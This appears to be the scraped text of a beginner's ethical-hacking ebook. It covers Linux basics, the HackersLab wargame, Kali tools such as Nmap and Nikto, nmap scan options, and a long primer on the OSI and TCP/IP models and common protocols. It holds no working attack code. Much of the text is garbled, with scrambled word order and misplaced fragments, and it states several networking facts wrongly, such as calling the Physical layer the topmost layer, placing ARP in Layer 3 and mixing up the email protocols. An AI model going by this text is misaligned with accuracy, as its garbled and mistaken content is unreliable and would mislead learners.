There are plenty of books on this subject on the market, thanks again for choosing this one! Every effort was made to ensure it is full of as much useful information as possible; please enjoy!  to   Once upon a time, there was a system called Unix. It was created by  Ken  Thompson,  Dennis  Ritchie,  and  the  team.  They  wanted  a system  superior  the  widely  used  Multicsin  season.  They developed  a  very  powerful  language  to  use  in  this  system:  the  C language. Many Unix variants have come up since then: Digital Unix, AIX, HPUX and even versions for personal computers like Xenix and Minix. It is precisely in Minix that our story begins. A student called Linus Torvalds used and undermined this system but thought it could be improved. Then, in the mid-1990s, Linus developed a kernel  the heart  of  a  system   of  a  new  system  based  on  Minix  and  the  Unix, called Linux  from Linus . From there, the popularity of the system is only  growing  and  there  are  even  different  versions  of  Linux   it  is interesting to note that there are more versions of Linux than Unix itself  today :  Red  Hat,  Mandrake,  SuSe,  Slackware,  Debian,  and even  the  Brazilian  Conectiva  compete  for  space  in  thousands  of servers and personal computers.  You may be wondering: Which version should I use to follow the book? Or: I have an affinity for this or that version of Linux, does it make any difference? No, not at all. We will only use commands in mode.shell   text .  Everything  that  is  done  in  the  shell  here  can  be done in the graphical interface and the commands hardly change on different  versions  of  the  system.  Don't  worry  if  you  don't  know  the commands: in the next chapter, I'll give you a brief explanation of the most important commands that you will use. Even if you only have Windows, you can enjoy the content since it is only by connecting to   HackersLab via telnet that you will be using Linux. This will be shown step by step at level 1.  We talk so much about this HackersLab ... What exactly is this? OHackersLab Challenge is a kind of “game” very well known in the security  and  hackers  circle  in  general.  It  is  so  well  known  that  it already  existed  until  the  Brazilian  version  was  made  by  UFRJ  Federal University of Rio de Janeiro .ro  which was named LockABit  www.lockabit.com .  The  challenge  is  simple   good,  in  terms .  You start  at  level  0.  Currently,  there  are  18  levels   counting  zero   to break. Once you win a challenge, you get the password to the top level. If the challenge ever ends, will the book lose its usefulness? Of course not. As I said, there are already other challenges based on HackersLab,  and  even  if  they  didn't  exist,  the  book  teaches  you enough  for  you  to  test  even  on  your  own  Linux  system.  What  if  I can't understand the higher levels? It does not matter...The book will always  be  a  reference  for  you.  It's  at  a  level  that  needs  C programming  and  you  can't  still  understand?  Learn  C  then,  first  of all. The goal of the challenge is to get you to level 17 practically, as a master. I can show you the way, but you have to walk the path alone. If you are new to the security world, I suggest you read the Hacker Guide,  so  you  will  have  a  better  basis  for  absorbing  what  will  be taught here.   Chapter 1 - Basic and Essential Linux: The Necessary Basics  In this chapter, I will cover what you need to know about Linux to perform  the  challenge.  Basically,  we  will  see  text  mode   shell    commands that will be some basic notions of system structuring and usage.  Throughout  the  challenges  shown,  I  will  explain  each command that will be used along with the details.  We have our structure of use divided into users and groups. This is  done  so  that  the  system  administrator  can  have  greater  control over who will access it. There is also the “superuser,” called “root” that,  regardless  of  permissions   which  we  will  see  below ,  can perform  anything  in  the  system.  A  practical  example:  My  user account  on  system  X  is  called  milestones  –  a  space  in  the home macros   folder  so  I  can  store  my  files.  My  group  within  this system  is  called  read.  It's  a  non-original  name  given  by  root  to designate  that  everyone  in  my  group  has  permission  only  to  read files, nothing more.  But  why  the  groups?  The  root  administrator  could  not  set  this straight  into  the  accounts.  It  could  ...  but  what  if  a  system  has  a thousand accounts? Not anymore. It is easy to separate into groups and perform the permissions collectively than individually?  Still  using   the  previous  example,  suppose   the folder home milestones, I have the permission to do whatever I want  read, write and execute files... . Let's go then. I created a text file called  test.txt.  When  I  list  the  data,  it  will  look  like  this:  -rwxr-x— milestones read 10297 test.txt ... What did we get? After test.txt we do not care. Let's look at the initial letters, which are the permissions of the text file I created. They are divided as follows: r -> readw -> writex -> execute and the division is done as follows: Type: - User:  inside    rwxGroup: rxAll others: -Explaining: In Type, it has nothing, so it is a file.  The  first  three  spaces  after  the  type  are  user  permissions,  i.e. who created the file  look at the name . The user macros then has rwx permission, he can read   r  , write  w   and execute   x   the file. Soon  after,  come  the  group  permissions.  Permission  will  affect everyone that belongs to my group  which in this case is the read . They have rx. As they don't have w, they can only read and execute but not write. And finally, the last three spaces are reserved for all users except the creator  milestones  and those in your group  read . Those who do not have r, w nor x can do nothing with my file. There is also a permission bit besides r, w, and x that will be very important ahead. This is s, the so-called SUID bit, which we will not talk about. Permissions  can  be  changed  as  well  as  users  to  whom  the  files belong. These and other commands are in the next topic.  Hacker Tools That Can Be Used In Kali Linux Among the many existing Linux distributions in the world, Kali is one of the most advanced. It is designed for specific purposes, such as  intrusion  testing  and  security  auditing,  and  features  a  range  of  ethical  hacking tools.  A big differentiator of Kali Linux is its repertoire of native tools to perform various tests - over 300. Not to mention that the system is free, stable, reliable and can be complemented by a vast amount of third-party applications.  The focus of this section is precisely to address the tools that the improve  security  rely  on   to   Kali  system  administrator  can  mechanisms within the company.  To  use  these  tools  you  must  have  KALI  Linux  installed. Resources can be found on the internet and there are a number of sites that overstep by step tutorials on how to download and install Kali Linux. So before proceeding with the next chapters – get started with the Kali Linux download and install!   Chapter 2 - Information Gathering  And Vulnerability Analysis  No  matter  how  well  developed,  any  software  product  contains bugs.  Some  of  them  remain  hidden  and  trouble-free,  while  others affect  performance  or  worse  open  breaches  for  threats  to  exploit sensitive data stored on a company's system.  In  this  context,  information  gathering  collaborates  through  more detailed surveys of the system, as well as its resources, server data, browsing history, network structure, and so on.  This  monitoring  measure  is  used  to  give  hackers  a  satisfactory information base to initiate threat modeling and then conduct attack tests  simulations .  In turn, vulnerability analysis, as its name implies, is the use of  tools that perform system-wide vulnerability analysis.  The result of such an analysis allows, for example, that all risks that the network is likely to suffer are mapped or reported in reports, listing all weaknesses that need corrections.  What are the most suitable tools for these activities? Check out 5  of them below: 1. NMAP Undoubtedly  Nmap  is  one  of  the  main  free  open  source  tools used  by  hackers,  widely  used  for  network  detection,  analysis,  and security audits.  In  short,  Nmap  is  considered  essential  for  gathering  details  of specific information on any active machine. To understand its many features, the official website itself provides a free guide.   2. SOCIAL ENGINEERING TOOLKIT Also known as SET, the Social Engineering Toolkit is designed to assist  in  penetration  testing  against  human  elements.  These  are embedded in the target's security environment, bearing in mind that people are often the weak link in security systems.  3. DNSENUM DNSenum is a tool for gathering DNS server information. Able to logs,  and  other  IP  addresses,   search  hosts,  server  names,  information using just a few basic commands.  4. NESSUS Undoubtedly  Nessus  is  one  of  the  most  complete  security applications  for  analyzing  and  auditing.  It  is  developed  by  award- winning  Tenable,  which  serves  more  than  21,000  companies globally.  With Nessus, information security professionals can run multiple scans  simultaneously,  have  constant  tool  updates,  a  variety  of plugins, and reports that can be generated through a dashboard.  5. CISCO-TORCH Following the same line of scanner tools, Cisco-torch has some peculiarities.  One  is  the  constant  use  of  forking  to  launch  multiple background  scanning  processes.  According  to  Hacking  Exposed Cisco Networks, this maximizes efficiency in detecting vulnerabilities. The purpose of the developers when creating Cisco-torch was to find an  agile  solution  for  remotely  discovering  Cisco  hosts  using  SSH, Telnet, Web, NTP, and SNTP protocols to launch dictionary attacks against discovered servers.  WEB APPLICATIONS Certainly,  you  already  know  or  have  a  good  idea  of    what  web applications  are  all  about.  But  not  to  be  blank,  we  define  web   applications as programs that run on web servers and are accessed via the browser.  For  web  applications,  we'll  talk  about  specific  tools  that  every  hacker should know about:  1. NIKTO2 This is an application to analyze a site's vulnerability. It performs:     Testing  for  over  6,700  potentially  dangerous  files  and  programs that are present on the web; Verification of server configuration; Analysis  of  crucial   items   automatically;  that  can  be  updated  Queries  for  over  1250  outdated  server  versions  and  their specific issues.  Nikto  is  characterized  by  the  ability  to  perform  activities  that,  in  theory, are highly complex. Besides, of course, being a free tool.  2. PARSERO Unlike other tools mentioned so far, Parsero is not a software, but a  script.  Written  in  Python,  it  reads  the  Robot.txt  file  from  a  web server  and  checks  for  unauthorized  entries,  which  will  tell  search engines   Google,  Ask,  Bing,  and  others   which  files  or  directories hosted on the server should not be indexed.  Sometimes,  even  though  paths  are  restricted  to  access  via search engines, they may be accessible to users who enter the site directly.  To address this issue, the Persero script checks the HTTP code status  of  each  entry  marked  Disallow  and  even  searches  through Bing to find improperly indexed content.  3. WAPITI Wapiti  enables  the  user  to  perform  black-box  testing,  a  method that examines an application's capabilities without checking internal   structures.  The tool does not study the source code of the web application but instead checks the web pages implemented by it for scripts into which  it  can  inject  data.  When  it  finds  the  scripts,  Wapiti  performs heavy data transmission to test its vulnerabilities.  Top Linux Commands Starting  the  challenge  Why  Join  HackersLab?

It  is  the  step  by  step resolution  of  the  pro.  After  reading  it  will  be  easy  for  you  to understand what will be done in this section.   What is the difference between using nmap localhost on our  computer and nmap [ip of our host] from another host?  >>  The  firewall.  Apparently,  nmap  localhost  does  not  take  into account the firewall and takes the open ports as such, while if we try to access from another computer the open ports that appeared in the first case in the second appear filtered to us.     What happens if we use the -p “* ” option  eg nmap -p "*" the  advantages  and   ?  What  are   scanme.nmap.org  disadvantages?  >>  All  ports  of  the  referenced  host   s   would  be  analyzed.  The advantage  is  that  each  and  every  TCP  port  of  the  target  host   s , which could be 65535 ports, is analyzed. The main disadvantage is the  response  time   By  default  it  only  scans  1000  most  common ports     What  would  happen  if  we  instead  executed  the  -F  option?  What advantages and disadvantages does it present?  >>  -F  requests  a  Fast  Scan,  in  which  only  the  100  most  used  ports, would be scanned.  The opposite would happen that in the previous question, it is a  very fast scanner but it covers many fewer ports.  To  which  set  of  commands  would  an  aggressive  survey   nmap -A  be equivalent?  >> Aggressive polling is equivalent to the Operating System  -O , version   -sV ,  script  scanner   -sC   and  traceroute   -  traceroute  scanning, all at once.  Does an ARP scan work outside our intranet? >> No  Is there a limit to the number of options we can execute in a  nmap scan?  >> Although we can use almost any option to our liking, there are some combinations that are not valid, in most cases because they are contradictory.      If we test these combinations, Nmap indicates it with a message. Ex: nmap -PN -sP [objective] -PN asks not to ping, while -sP requests a ping scan   Chapter 3 – Understanding  Everything about Network Security  IT security revolves around the concept of network security given the  network's  importance  as  an  organizational  asset.  These networks,  on  the  whole,  involve  a  variety  of  devices  ranging  from storage to security to input output apart from operating systems, data and  software  and  people.  Without  a  thorough  knowledge  of  these software  and  hardware  components,  being  able  to  implement  and maintain security will be a tough order.   Experts  believe  that  network  security  is  best  maintained  when one  acts  proactively  to  mitigate  threats  and  vulnerabilities.  This  is because  of  a  fast-changing  world  where  new  technologies  require security  professionals  to  make  tradeoffs  between  ease  of  use  and security. But, for a start, we will examine these network components, their  functions  and  their  relevance  to  security.  Also,  by  looking  at networking  fundamentals  in  this  chapter,  we  should  be  able  to understand  transmission  security  where  encryption  among  other strategies will help you protect data that is either at rest or in transit. There  are  titled Communication & Network security.  learning  objectives   the  domain   four   for   Applying Secure Design Principles to Network Architecture The modern world cannot do without a number of services such as  email,  online  banking,  the  Internet.  This  is  clearly  because computers  are  now  able  to  communicate  over  a  network.  For  this, protocols  serve  the  primary  function  of  sending  data  over  this medium.  Yet  it  wasn’t  as  seamless  as  this  in  the  early  days  since companies  created  their  own  protocols  and  it  was  difficult  for computers  to  interact  with  each  other.  As  a  result,  the  OSI  model   came  into  existence  thanks  to  the  efforts  of  the  International Organization for Standardization  ISO .  Even  if  the  TCP IP  model  became  the  preferred  standard  over the  years,  the  OSI  model  has  been  instrumental  in  helping  with building network communication technology since the eighties. Now, since  the  OSI  and  TCP IP  models  serve  as  the  cornerstone  for networking,  understanding  these  will  enable  the  security  architect and professional to design and implement networks that will protect the confidentiality and integrity of data in transit and at rest.  Now,  before  we  look  at  the  OSI  model  in  detail,  there  are  two  things that make it stand out:  The communication process is broken into seven layers layer  works  and  can  be  changed  and  where  each  independently without affecting the others.  The OSI Model still continues to serve as a framework for both  hardware  and  software  developers  ensuring  that interoperability  continues  to  remain  a  part  of  network communication as envisioned since its early days.  As  for  the  TCP IP  model  that  we  will  look  at  next,  it  was developed almost a decade earlier. While sharing a few similarities with the OSI model, it has four layers in all that align with the OSI Model  layers.  It  must  be  pointed  out  that  with  the  success  it  has enjoyed, the OSI Model ensured that it included the TCP IP protocol suite which is found in every operating system today.  OSI Model As mentioned earlier, the OSI Model followed a layered approach where each of the layers performs a specific function. Simply put, it allocates separate responsibilities to each layer that determine how two systems communicate over the internet. For this to happen, both systems  should  be  using  the  same  protocol  even  if  they  might  be very  different.  Even  if  the  TCP IP  Model  is  used  widely  today,  the OSI  Model  is  still  very  important  given  that  a  number  of  vendors used it to create their own networking framework while remaining an open network architecture.   Now,  as  we  discuss  the  seven  layers  that  the  OSI  Model provides, we must also understand that each layer also has its set of protocols.  Think  of  a  common  protocol  used  as  a  set  of  rules  that helps two systems communicate.   That said, even if computers over a network communicate via a physical  connection,  there  are  logical  channels  that  are  used  for communication as well. Each of these channels or layers operates independently  even  if  they  work  in  tandem  with  the  next  layer  to ensure data transmission. They are also known to communicate with the same layer based on the OSI Model on other systems through the method of encapsulation.  OSI Models consists of seven layers where the Application layer is considered to be the seventh and the topmost while the Physical layer  is  the  bottommost.  Now,  when  the  data  you  want  to  transmit enters this protocol stack, it begins its journey as a data stream and exits the stack in the form of bits. As it passes through each layer, it adds on more information in the form of headers and footers that will ensure  that  the  data,  in  the  form  of  a  packet,  is  delivered  to  its destination.  This  process  is  known  as  encapsulation  or  de- encapsulation  depending  on  whether  the  system  is  delivering  or receiving  data.  In  other  words,  the  reverse  takes  place  when  a system  is  receiving  data.  Let  us  look  at  each  of  these  layers beginning from Application to the Physical layer,  Layer 7: Application As the topmost layer when sending data, it receives data from the user application through an application programming interface  API . As a result, the data is added to a container otherwise known as a protocol data unit and is then handed over to the Presentation layer. Examples of protocols that operate at this level include DNS queries, SMTP email transfers and the HyperText Transfer Protocol  HTTP  that works to transfer pages over the network.    Layer 6: Presentation   In   One thing is important to note: no layer that receives data alters the  information  but  adds  information  that  aids  in  it  reaching  its destination.  the formatting of data takes place so as to ensure that the same layer at the  destination  computer  is  able  to  read.  For  the  most  part,  it identifies the type of data apart from the application that will be able to read it.   information  about   the  Presentation   layer,   A  simple  example  of  this  involves  the  sending  of  a  PDF document from a Windows 10 to an Ubuntu system. Not only will the Presentation layer determine the MIME type  pdf in this case  but will add this information in the header as it sends the data to the Session Layer.   When it reaches the receiver’s computer, the Presentation Layer is  able  to  identify  the  file  type  by  reading  the  header  and  which results in a PDF viewer being opened to view the file. This layer also helps with encryption and compression of files where the information pertaining to these two aspects is added for the Presentation layer on  the  destination  system  so  the  file  can  be  decrypted  and decompressed.  That  said,  if  your  computer  does  not  have  an application  that  can  open  the  file,  the  Presentation  Layer  in  your system will only display an unassociated icon.  Layer 5: Session Once the protocol data unit is passed on to this layer, it works to initiate a connection with an application or service on the receiver’s system apart from maintaining and closing the connection after the data has been transmitted. As for the information it adds about the application  or  service  that  it  has  to  make  a  connection  with,  this includes  a  port  number  and  after  which,  the  protocol  data  unit  is passed on to the transport layer.  As for the connections that this layer seeks to make, they consist  of three types:  Simplex - Communication that takes place in one direction   Half-duplex - communication that occurs in both directions even  data is only sent in one direction  Full-duplex - Communication and data flow that occurs in both  directions  Layer 4: Transport Now, once the information has been added to the Session layer, the  next  step  is  to  lay  some  ground  rules  regarding  the  session underway. This is done by a handshaking process where the three- way  handshake  for  TCP.  Now  before  we  describe  how  this  layer deals with that, it must be pointed out that the protocol data unit is now converted into a segment.  Not  only  does  the  Transport  Layer  determine  how  much  data must  be  sent  at  a  time  but  also  the  sequence  in  which  they  are transferred to the destination system. Apart from this, it also handles issues such as missing packets apart from verifying the integrity of the data. That said, the Transport Layer is also responsible for how network devices are referenced or addressed. Some of the popular protocols  that  operate  in  this  domain  include  Transmission  Control Protocol   TCP ,  User  Datagram  Protocol   UDP ,  Secure  Sockets Layer  SSL  and Transport Layer Security  TLS .  While both the Session and Transport layer perform a common function of setting up and completing a session during which data is transmitted, the former sets up a session between applications while the  latter  performs  this  very  same  function  between  two  computer systems on the whole.  Layer 3: Network Once a segment of data is received by the Network layer, source, and destination, IP addresses are added where the latter system will be located on the same network or at a remote one. Depending on which, routing information will also be added to the segment as well. After  this  is  complete,  the  segment  is  now  referred  to  as  a  packet and which will be passed on to the Data Link Layer. Simply put, the packet will contain the necessary information that will help it to move   from one LAN to another. Some common protocols in this layer are Internet  Protocol   IP ,  Internet  Protocol  Security   IPSec ,  Routing Information  Protocol   RIP   and  Internet  Message  Control  Protocol  IMCP .  Routers  and  routers  are  devices  that  help  with  these Network layer functions.  Layer 2: Data Link The  Data  Link  layer  is  responsible  for  preparing  the  received packet to be transmitted as a frame to the destination system on a particular network. Each of these networks has its own hardware and technology.  Some  of  these  networks  are  Token  Ring,  Ethernet, asynchronous transfer mode  ATM , Fiber Distributed Data Interface  FDDI  and Copper DDI.  The  Data  Link  layer  understands  what  format  is  necessary  to successfully transmit the data without error and then passes it on to the Physical layer. That said, there are two Data Link sublayers that carry out these tasks and which consist of the Logical Link Control  LLC  and the Media Access Control  MAC  sublayers. It’s the MAC sublayer that determines what type of network the frame will have to be transmitted to and adds that information along with the frame.  Finally, the protocols that perform functions in this layer include Point-to-Point  Protocol   PPP ,  Address  Resolution  Protocol   ARP  and Reverse Address Resolution Protocol  RARP .  Layer 1: Physical As  the  topmost  layer  in  the  OSI  Model,  the  Physical  layer receives frames from the Data Link layer and then converts it to bits  zeroes  and  ones   so  as  to  transmit  it  over  the  network.  When  it receives data in the form of bits, it will also convert this into frames and  then  transmit  it  to  the  Data  Link  Layer.  It  must  be  pointed  out that  the  device  drivers  operate  at  the  Physical  layer  in  order  to instruct the protocols as to how the frames must be transmitted or received as bits. Some of the protocols include SONET, Bluetooth, RS-232 and DSL at the Physical layer.   Also,  there  are  network  hardware  devices  that  operate  at  this layer  and  which  include  Network  interface  cards   NICs ,  hubs, repeaters,  amplifiers  and  concentrators  that  help  in  transmitting signals over long distances.  Since  this  covers  only  wired  connections,  wireless  and  optical fiber networks represent these bits using alternating radio waves and light.  TCP IP Model If there’s one aspect that both the OSI and TCP IP Model share, it’s  the  idea  of  packet  sharing.  Developed  in  the  seventies  by DARPA, the TCP IP Model found its humble beginnings when it was implemented  as  a  Wide  Area  Network   WAN .  Of  course,  the Internet, as we know, is a global network that consists of these wide area networks and Internet Service providers.  There’s  very  little  difference  between  the  two  models  since  the OSI  Model  offers  seven  layers  while  the  TCP IP  Model  only  uses four. Even then, the functions are very similar with the exception that the TCP IP Model focuses on the TCP IP protocols when it comes to data transmission. Still, this is a protocol suite that consists of both the TCP and IP protocols apart from several more. That said, even if the OSI and TCP IP models are similar, their layers don’t necessarily map neatly when it comes to functions.   Network Access or Link Layer The Network Access Layer in the TCP IP Model combines both the  Physical  and  Data  Link  layers  of  the  OSI  Model.  Hence,  using the LLC and MAC sublayers, it will not only add information such as the  source  and  destination  MAC  addresses  but  it  will  also  add  a trailer so as to verify the integrity of the data. But that’s not all: it also carries  out  the  function  of  sending  bits  of  data  across  the  physical medium  to  be  it  fiber,  wired  or  wireless.  Some  of  the  common protocols used in this layer include IEEE 802.3 and 802.11 as well as the Address Resolution Protocol  ARP  and the Neighbor Discovery Protocol  NDP . Internet   This layer is responsible for routing and finding the location of the destination host. If this isn’t determined by the Internet layer, then the Transport layer will not be able to set up a connection. The way it does  this  is  by  placing  the  source  and  destination  IP  addresses  in the packet. There are four protocols that help out with this namely Internet  Protocol  v4  &  Internet  Protocol  v6   IPv4  &  IPv6 ,  Internet Control  Message  Protocol   ICMP ,  Internet  Group  Management Protocol  IGMP  and Address Resolution Protocol  ARP . Given how important it is for security professionals to understand IP addresses and classes, it’s worth looking at.  the  same   Host-to-Host Transport Layer When  you  compare  the  OSI  and  TCP IP  Models  here,  they perform  function  and  which  involves  opening  and maintaining a connection between two hosts. This function must be carried  prior  to  other applications. Usually, there exist two ways by which this is achieved by  a  connectionless  or  connection-oriented  transmission.  For  the former,  UDP  serves  the  connectionless  protocol  in  the  Transport Layer while TCP is the connection-oriented protocol used here.   layer  sending  data   the  Application   to   No  matter  which  one  is  more  appropriate,  the  port  number  and the transport protocol will always be provided to the receiving host. While TCP offers much more in terms of functionality and reliability, it comes at a cost. The header when using the TCP protocol is much larger  compared  to  the  UDP  protocol  even  if  there’s  a  greater chance  of  all  packets  being  delivered  by  virtue  of  the  three-way handshake that takes place before any data is transmitted.   Application Also known as the process-to-process layer, the Application layer handled  the  tasks  that  are  taken  care  of  by  the  Application, Presentation and Session layers in the OSI Model. In other words, the layer merely created information and sends it to other processes or  applications  on  another  host.  There  are  particular  functions  that protocols  operating  in  this  layer  perform  and  which  are  related  to applications  and  services.  In  stark  contrast,  the  Transport  layer   protocols  merely  detect  the  location  and  routing  in  the  effort  to support  these  higher-layer  protocols.  Along  with  the  data  that  is transmitted,  the  receiving  host  is  also  provided  with  port  numbers that identify these upper-layer protocols and the programs they are associated with.  IP Networking As  we  learned  in  the  TCP IP  Model,  IP  is  responsible  for delivering packets from a source to a destination. At the same time, in  the  next  layer,  a  MAC  address  is  added  as  well.  While  the  IP address is a logical address, the MAC address is a permanent one and  which  is  why  it  called  a  physical  address  and  they  are  sent together for a good reason. Then there is also the port number that is  sent  to  indicate  which  service  or  program  said  the  protocol  is linked  within  the  Application  layer.  When  you  send  both  the  port number  and  the  IP  address,  this  is  generally  called  a  socket  and which is necessary to send information to the right location.  IPv4 Broken  up  into  four  octets,  an  IP  address  looks  like  this: 192.13.139.130.  It  gives  us  information  about  the  network  number and who the hosts were depending on the class, the network number could  range  from  the  leftmost  octet  to  three  of  the  leftmost  octets while the fourth octets point to the host within that network.  Of  course,  with  the  introduction  of  Classless  Inter-Domain Routing in the 1990s, the allocation of IP addresses is not based on the  number  of  hosts  in  a  network  but  merely  on  the  unallocated addresses available.  Of  course,  there  is  a  private  IP  address  that  is  still  used  today, and  which  has  specific  ranges  in  the  four  classes  as  well.  These types of addresses are restricted to use within private networks and are  not  routable  over  the  Internet.  However,  there  is  a  provisional service called the Network Address Translation service that will route information over the internet but also convert a private IP address to a public one and back. Still, even if this seems like a useful service for being able to represent an entire network of IP addresses as one   single address, IPv6 has always been the preferred choice when it comes to dealing with the lack of IPv4 addresses.  IPv4 vs. IPv6 Up  until  the  1990s,  IPv4  was  being  used  but  with  the  growing popularity of the internet, the protocol was experiencing much strain. Security and a lack of unallocated addresses were at the core of its problem. For this, IPv6 was introduced and brought with it benefits such  as  a  larger  address  field,  better  security,  smaller  IP  packet header and improved quality of service.  MAC Addressing Up until we’ve only looked at addressing that takes place at layer 3 and that are known as logical addressing. MAC addressing takes place  at  layer  2  and  which  is  classified  as  physical  addressing because it is a permanent and unique address.   A normal MAC address looks like this: 02:25:31:55:72:ac  There’s  a  good  reason  for  MAC  addresses  to  be  this  way  too. This comes in handy when the ARP changes the MAC addresses at every hop, which ensures that a packet will reach its destination by moving  throughout  each  of  these  network  devices  along  the  way based on the routing information.  Network Transmission Types There are a variety of media types that are used to transmit data that  involve  unique  processes  and  which  possess  distinct characteristics.  Let  us  discuss  a  few  of  these  common  network transmission types:  1: Analog vs. Digital This is probably the best example to describe analog signals as used in analog telephony. By nature, analog signals have an infinite number  of  values.  Digital  signals,  on  the  other  hand,  that  occur  in computer  transmissions  have  two  values:  on  and  off.  As  a  result, digital  signals  are  preferred  because  they  are  less  susceptible  to   noise  on  the  line  but  can  travel  much  further  compared  to  analog signals.  2: Asynchronous vs. Synchronous When  two  systems  are  communicating,  using  the  same  data format is just as important as being using the same synchronization technique. While asynchronous data transmission uses to start, stop and  parity  bits  to  ensure  the  accurate  transmission  of  data, synchronous transmission employs a clocking mechanism that syncs both  the  sender  and  the  receiver.  Quite  clearly,  it  uses  a  different type  of  error  checking  and  in  being  superior  to  synchronous transmissions, is used for high-speed, high-volume transmissions.  3: Broadband vs. Baseband Since  all  data  transmission  occurs  through  communication channels,  multiple  transmissions  can  complicate  matters.  Sharing the  channel  becomes  inevitable  and  which  brings  us  to  the broadband  and  baseband  methods  of  doing  this.  While  multiple transmissions  are  allocated  different  time  slots  on  a  channel   also known  as  Time  Division  Multiplexing ,  another  approach  involves sharing  the  channel  by  breaking  the  medium  up  into  different frequencies   also  known  as  Frequency  Division  Multiplexing .  The first  is  called  baseband  while  the  latter  is  called  broadband.  Since the latter allows for data transmission to occur simultaneously, it is a preferred method of data transmission.  4: Unicast, Multicast & Broadcast There  are  three  types  of  transmissions  that  occur  that  differ  in regard  to  the  extent  of  their  reception.  The  unicast  method  is  also known  as  one-to-one  and  is  a  transmission  from  one  system  to another. A signal that is sent from one system to many is called a multicast transmission. Finally, if one signal is sent to every system in  the  network,  it  is  known  as  a  broadcast  or  a  one-to-all transmission.  5: Wired vs. Wireless Since not all transmissions use a wired connection, the way the bits  are  represented  differ  based  on  the  type  of  medium  you  are   using. With copper wires, shifts in voltage do this while in optic fiber cables, light in the form of LED or lasers carry out the same function. Wireless transmissions use light or radio waves to do the same.  When a packet moves from the wired to a wireless network, the physical and data link layers are prone to change and which calls for the  necessary  protocol  to  be  used  to  deal  with  this  change.  That said, the other layers of the OSI model do not undergo any changes much like the Physical and Link layers as described in this sense.  Network Types There’s  a  third  way  of  looking  at  networks  and  which  involves network types. Some of the common types include LAN, MAN, and WAN apart from extranet and intranet.   LAN, MAN & WAN The traditional interpretation of LAN involves a set of computers linked  in  an  office  but  by  modern-day  standards,  it  is  any  network that consists of a speed greater than 10 MBps. On the other hand, A MAN  is  a  wide  area  network  that  is  spread  over  larger  distances serve much like the downtown area of a city. It serves as a backbone for LANs to connect with. Finally, a WAN connects both LANs and MANs  together  and  which  is  generally  offered  as  a  service  from  a telecommunications company. Of course, the Internet is the perfect example of a WAN. That said, not all WANs connect to the internet but are private, dedicated links that organizations will pay for.  Intranet & Extranet Both  these  network  types  that  exist  within  an  organization  and segregated  for  security  purposes.  While  the  intranet  is  the  internal network  of  the  organization,  the  extranet  offers  organizational resources to customers, business partners and the public. That said, sensitive information should not be placed in the latter. The extranet should  be  constantly  monitored  much  like  the  intranet  is  protected with firewalls and strong authentication mechanisms.   Protocols & Services   Due to the increasing popularity of the use of networks, several new protocols have been developed since the nineties. Much like the protocols  that  we  discussed  in  the  Application  layer  of  the  TCP IP Model, these protocols are linked with a particular service. Some of these protocols that we will discuss going forward do not only lie in the Application layer but in lower layers that deal with routing and the delivery  of  packets.  As  always,  port  or  protocol  numbers  are considered important  ARP Known as the Address Resolution Protocol, this protocol resides in Layer 3 of the OSI Model. The objective of ARP is to add the MAC address of the destination host by sending a broadcast frame over the  network.  The  destination  host  with  its  unique  IP  address responds  with  its  MAC  address.  This  information  is  added  to  the packet header.  DHCP This service helps you automate the assigning of IP addresses to all  devices  in  a  network  and  exists  as  a  client  in  any  operating system. Since it is a client server program, you can even configure it as a server. This is easy since most operating systems have DHCP clients. DHCP uses UDP ports 67 and 68.  DNS This  service  is  instrumental  in  the  sense  that  it  resolves  IP addresses  of  hosts  as  a  computer  name.  Similarly,  domain  names are assigned to websites. DNS exists as a client server program in most operating systems and uses UDP and TCP port 53.   ICMP This ICMP operates at the Network Layer of the OSI Model and is  used  by  systems  to  transmit  error  messages  if  problems  with transmissions arise. The ping and traceroute commands are a part of this protocol and that helps with network connectivity problems.  FTP, FTPS, SFTP, NFS & CIFS SMB   The File Transfer Protocol  FTP  is commonly used to transfer a file from one system to another. FTPS and SFTP are more secure versions of this protocol. NFS is a file-sharing protocol that is used in UNIX Linux systems. The CIFS SMB protocol uses TCP port 445.  HTTP, HTTPS & SHTTP The HTTP protocol is used to transfer web content and has two other secure versions namely the HTTPS and SHTTP. HTTPS adds HTTP on top of the SSL TLS protocol. While HTTP uses TCP port 80, HTTPS uses TCP port 443. SHTTP plays the role of encrypting the served and saved page data.  POP, SMTP & IMAP All three protocols work in order to retrieve emails. While POP3 is the  latest  version  and  allows  for  download  only.  IMAP4  accesses email from a server but it not only downloads a copy from the server but  leaves  one  there  too.  SMTP  differs  from  both  POP  and  IMAP because it is used for communication between email servers.   SNMP This Application layer protocol retrieves information from network devices and uses the UDP 161 as well as TCP 161 and 162 ports. Even though this protocol is susceptible to packet-sniffing and brute force attacks, the SNMPv3 protocol is considered most secure.  Implications of Multi-Layer Protocols As  you  can  see,  encapsulation  plays  a  big  role  in  the  TCP IP model  and  which  gives  rise  to  the  possibility  of  being  a  multi-layer protocol. In today’s world, plenty of proprietary protocols have been developed  and  are  used  in  industrial  control  systems  and  power grids. Since these SCADA systems aren’t secure, security architects and professionals are learning how to protect these critical systems. Of  course,  there  are  other  multi-layer  protocols  that  are  used  for profit.  Some  use  the  TCP IP  protocol  stack  in  order  to  route  their own protocols. As mentioned earlier, encapsulation helps in creating multi-layer  protocols  much  like  this  simple  example  mentioned below:   [ Ethernet [ IPSec [ IP [ TCP [ SSL [ HTTP ] ] ] ] ] ]  As you can see, HTTP is encapsulated by SSL, TCP, IP, IPSec and  Ethernet  and  which  can  prove  to  be  advantageous  given  that you  can  support  complex  network  structures  with  a  high  degree  of flexibility  and  resiliency.  The  downside  is  that  multi-layer  protocols are sometimes used for covert tasks that are anything but useful or positive.  In  particular,  there  is  one  multi-layer  protocol  referred  to  as  the Distributed Network Protocol  DNP3  and which is largely used in the electric,  water  utility,  and  management  industries.  Its  purpose  is  to facilitate  communication  between  data  acquisition  and  system control systems in place. This multi-layer protocol is very similar to the TCP IP protocol suite and is an open and public standard.  Converged Protocols Converged  protocols  are  those  that  involve  the  merging  of proprietary  protocols  with  standard  protocols  much  like  TCP IP.  In fact, one can use TCP IP support network infrastructure to host their own services. This saves money, reliability, and throughout vary from implementation to implementation.  Here are four examples of converged protocols: FCoE Fibre  Channel  is  a  network  data  storage  solution  that  can  help you transfer files at a high speed from 16 GBps and above. While fiber-optic  cables  were  to  be  used  in  its  operation,  another  less expensive  was  developed  using  copper  wires  known  as  Fibre Channel  over  Ethernet   FCoE .  It  operates  as  a  Layer  3  protocol, uses  separate  cables  and  replaces  IP  to  become  the  standard payload of any standard Ethernet network.  MPLS Multilabel  Protocol  Label  Switching  avoids  the  use  of  longer network  addresses  but  uses  shorter  paths  labels  to  move  data across a network. This can save much more time compared to the   